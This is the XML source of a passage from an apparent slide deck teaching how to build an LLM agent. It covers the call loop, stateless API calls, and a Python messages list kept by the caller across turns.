                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ust two pieces, and both of them are small:</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The loop.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> You call the model, get a response back, decide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to do next, and call it again. The model itself has no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memory - YOU carry the conversation across calls, in a list.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The tools.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Functions you let the model invoke - reading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file, running a command, querying a database. The model picks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it wants to call, you actually run it, and you hand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result back.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T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>he engineering all lives in the tools and the prompting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 T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>he loop itself is about</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ten lines.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47"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Google Shape;148;p5"/>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The Loop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sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;g3ec891ba402_1_42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LLM is just an HTTP API</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Google Shape;155;g3ec891ba402_1_422"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="297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A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>n API is an HTTP endpoint that</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" marR="0" lvl="0" indent="-355600" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="666677"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>takes some input</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="666677"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="0" indent="-355600" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="666677"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>runs something on a server</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:srgbClr val="666677"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="0" indent="-355600" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="666677"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>gives you back some output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That’s all an LLM API is</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>. The Claude API endpoint takes a JSON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a list of messages, and returns a JSON body with the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>next message.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="6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0"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Google Shape;161;p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LLM is just an HTTP API</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162" name="Google Shape;162;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="5279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A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>n API is an HTTP endpoint that</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" marR="0" lvl="0" indent="-355600" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="666677"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>takes some input</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="666677"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="0" indent="-355600" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="666677"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>runs something on a server</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:srgbClr val="666677"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="0" indent="-355600" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="666677"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>gives you back some output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That’s all an LLM API is</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>. The Claude API endpoint takes a JSON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a list of messages, and returns a JSON body with the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>next message.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POST  https://api.anthropic.com/v1/messages</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Input:  a list of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>{role, content}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> objects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Output: one more </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>{role: "assistant", content: ...}</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sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Google Shape;168;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One API call, one response</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Google Shape;169;p7"/>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170" name="Google Shape;170;p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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="389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from anthropic import Anthropic</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client = Anthropic()                    # reads ANTHROPIC_API_KEY from env</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response = client.messages.create(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model="claude-opus-4-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>8</a:t>
            </a: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max_tokens=1024,</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{"role": "user", "content": "What is the capital of France?"},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print(response.content[0].text)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-&gt; "The capital of France is Paris."</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="2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g3ec891ba402_1_23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Multi-turn work, and the model has no memory</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Google Shape;178;g3ec891ba402_1_234"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="1139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An agent does multi-turn work</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>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 this file, then summarize the bug, then propose a fix" is three turns at minimum.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="6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3"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184" name="Google Shape;184;g3ec891ba402_1_24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Multi-turn work, and the model has no memory</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="Google Shape;185;g3ec891ba402_1_240"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="273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An agent does multi-turn work</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>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 this file, then summarize the bug, then propose a fix" is three turns at minimum.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T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>he model has no memory</a:t>
            </a:r>
            <a:endParaRPr b="1"/>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call to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>messages.create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> is stateless, so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server has no idea you called it 30 seconds ago.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="6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0"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="191" name="Google Shape;191;p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Multi-turn work, and the model has no memory</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192" name="Google Shape;192;p8"/>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An agent does multi-turn work</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>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 this file, then summarize the bug, then propose a fix" is three turns at minimum.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T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>he model has no memory</a:t>
            </a:r>
            <a:endParaRPr b="1"/>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call to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>messages.create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> is stateless, so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server has no idea you called it 30 seconds ago.</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Which means if you want turn two to know anything about turn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have to *send turn one again*, plus turn two, and so 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whole conversation lives in your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>messages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> list, on your si</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>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You're the one keeping state, not the server.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g3ec891ba402_0_1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loop</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;199;g3ec891ba402_0_1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00" name="Google Shape;200;g3ec891ba402_0_1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g3ec891ba402_0_10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="175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messages = []</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while True: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user_input = input("&gt;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if not user_input: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break</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="2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g3ec891ba402_0_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loop</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Google Shape;208;g3ec891ba402_0_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09" name="Google Shape;209;g3ec891ba402_0_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g3ec891ba402_0_2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="368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messages = []</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while True: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user_input = input("&gt;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if not user_input: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break</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messages.append({"role": "user", "content": user_input})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response = client.messages.create(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model="claude-opus-4-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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max_tokens=1024,</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messages=messages,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sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p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The loop</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="Google Shape;217;p9"/>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18" name="Google Shape;218;p9"/>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9"/>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messages = []</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while True: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user_input = input("&gt;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if not user_input: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break</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messages.append({"role": "user", "content": user_input})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response = client.messages.create(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model="claude-opus-4-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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max_tokens=1024,</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messages=messages,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reply = response.content[0].text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messages.append({"role": "assistant", "content": reply})</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print(reply)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sp>
        <p:nvSpPr>
          <p:cNvPr id="225" name="Google Shape;225;p1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1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>W</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>hat does </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>the next turn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> see?</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Google Shape;226;p10"/>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27" name="Google Shape;227;p10"/>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10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
